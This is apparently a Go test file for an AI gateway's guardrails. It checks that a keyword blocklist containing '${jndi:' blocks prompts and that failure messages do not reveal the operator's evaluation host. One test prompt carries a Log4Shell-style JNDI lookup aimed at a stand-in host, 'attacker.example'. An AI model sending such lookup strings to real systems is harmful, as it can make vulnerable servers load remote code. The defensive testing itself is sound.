package orgfactory_test

// These tests run against the real org-config factory the gateway wires.
//
// An org config may hold "${" anywhere the gateway never expands: a keyword
// blocklist word such as "${jndi:" is a working check,
// and the gateway runs it from org config exactly as written. And a check's
// failure message reaches the org (the 403 a block answers), so it must not
// name the operator's evaluation host: FI_BASE_URL is operator config that an
// org's futureagi check without a base_url still uses, but where it points is
// not the org's to learn.

import (
	"context"
	"encoding/json"
	"net/http"
	"strings"
	"testing"
	"time"

	guardrails "github.com/futureagi/agentcc-gateway/internal/guardrails"
	"github.com/futureagi/agentcc-gateway/internal/guardrails/orgfactory"
	"github.com/futureagi/agentcc-gateway/internal/models"
	"github.com/futureagi/agentcc-gateway/internal/pipeline"
	"github.com/futureagi/agentcc-gateway/internal/tenant"
)

// djangoPushedBlocklist is the guardrails section the control plane pushes
// for an org that saves a keyword blocklist holding "${jndi:" (the payload
// test_guardrail_env_reference.py asserts Django sends). The gateway decodes
// it into the org's tenant config as is.
const djangoPushedBlocklist = `{
  "checks": {
    "keyword-blocklist": {
      "enabled": true,
      "action": "block",
      "confidence_threshold": 0.8,
      "config": {"words": ["${jndi:"]}
    }
  }
}`

func processOrgPrompt(t *testing.T, orgID string, section *tenant.GuardrailConfig, prompt string) pipeline.PluginResult {
	t.Helper()
	store := tenant.NewStore()
	store.Set(orgID, &tenant.OrgConfig{Guardrails: section})
	p := guardrails.NewPlugin(nil, map[string]guardrails.Guardrail{}, orgfactory.New(loopbackListed(t)), nil, store)
	raw, _ := json.Marshal(prompt)
	return p.ProcessRequest(context.Background(), &models.RequestContext{
		RequestID: "org-literal-req",
		Metadata:  map[string]string{"org_id": orgID},
		Timings:   map[string]time.Duration{},
		Request: &models.ChatCompletionRequest{
			Model:    "gpt-4",
			Messages: []models.Message{{Role: "user", Content: raw}},
		},
	})
}

// A blocklist word that holds "${" is a working org check: the gateway builds
// it from org config and blocks the prompt that carries it, and passes one
// that does not. Nothing reads the environment for it.
func TestOrgBlocklistWordWithDollarBraceBlocksItsPrompt(t *testing.T) {
	var section tenant.GuardrailConfig
	if err := json.Unmarshal([]byte(djangoPushedBlocklist), &section); err != nil {
		t.Fatalf("decode the pushed section: %v", err)
	}

	res := processOrgPrompt(t, "org-literal-blocklist", &section,
		"please log ${jndi:ldap://attacker.example/a} for me")
	if res.Error == nil {
		t.Fatal("a prompt carrying the blocklist word ${jndi: was not blocked")
	}
	if res.Error.Status != http.StatusForbidden || res.Error.Code != "content_blocked" {
		t.Fatalf("block answered %d %q, want 403 content_blocked", res.Error.Status, res.Error.Code)
	}
	if !strings.Contains(res.Error.Message, "keyword-blocklist") || !strings.Contains(res.Error.Message, "${jndi:") {
		t.Fatalf("block message %q should name the check and the word", res.Error.Message)
	}

	clean := processOrgPrompt(t, "org-literal-blocklist-clean", &section, "a prompt with no such word")
	if clean.Error != nil {
		t.Fatalf("a prompt without the word was refused: %v", clean.Error.Message)
	}
}

// An org futureagi check that names no base_url calls the operator's
// FI_BASE_URL. When that call fails, the 403 the org gets must say the check
// failed without naming where the gateway connected: not the host, not the
// port, not the path. Two operator hosts: an address (connection refused) and
// a name that never resolves (a DNS failure, or a proxy failure when the
// environment routes non-loopback calls through a proxy).
func TestOrgFutureAGIFailureNeverNamesOperatorHost(t *testing.T) {
	cases := []struct {
		name      string
		baseURL   string
		forbidden []string
	}{
		{"address", "http://127.0.0.1:9/operator-fi-host",
			[]string{"127.0.0.1", "operator-fi-host", ":9", "http://", "dial tcp"}},
		{"hostname", "http://fi-backend.example-operator.invalid:8443/operator-fi-host",
			[]string{"example-operator.invalid", "fi-backend", "operator-fi-host", "8443", "http://", "dial tcp", "lookup", "proxyconnect"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Setenv("FI_BASE_URL", tc.baseURL)
			section := &tenant.GuardrailConfig{Checks: map[string]*tenant.GuardrailCheck{
				"futureagi-eval": {
					Enabled: true,
					Action:  "block",
					Config: map[string]interface{}{
						"provider":   "futureagi",
						"api_key":    "literal-org-key",
						"secret_key": "literal-org-secret",
						"eval_id":    "toxicity",
						"timeout":    "3s",
					},
				},
			}}

			res := processOrgPrompt(t, "org-literal-"+tc.name, section, "an org request the check evaluates")
			if res.Error == nil {
				t.Fatal("a futureagi check whose evaluation call fails must block (action block)")
			}
			msg := res.Error.Message
			t.Logf("the org's 403: %s", msg)
			for _, s := range tc.forbidden {
				if strings.Contains(msg, s) {
					t.Errorf("the org's 403 names the operator's evaluation host (%q): %q", s, msg)
				}
			}
			if !strings.Contains(msg, "futureagi-eval") || !strings.Contains(msg, "futureagi evaluation failed") {
				t.Errorf("the 403 should still say which check failed: %q", msg)
			}
		})
	}
}
